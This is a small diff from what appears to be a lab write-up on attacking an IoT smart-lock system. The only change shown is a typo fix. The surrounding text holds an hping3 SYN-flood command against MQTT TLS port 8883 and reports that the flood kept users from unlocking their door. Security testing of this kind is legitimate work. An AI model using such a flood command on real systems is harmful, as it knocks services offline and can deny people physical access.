@@ -10,4 +10,4 @@ kali@kali:~$ sudo hping3 "IP ADDRESS of Target" -q -n -d 120 -S -p 8883 --flood 
 Note: Port used is 8883 (MQTT TLS port). </br>
 We were successful in disrupting the MQTT services which disallowed the users from unlocking their door.
 
-*Indicate how Ip address is scanned 
+*Indicate how IP address is scanned 
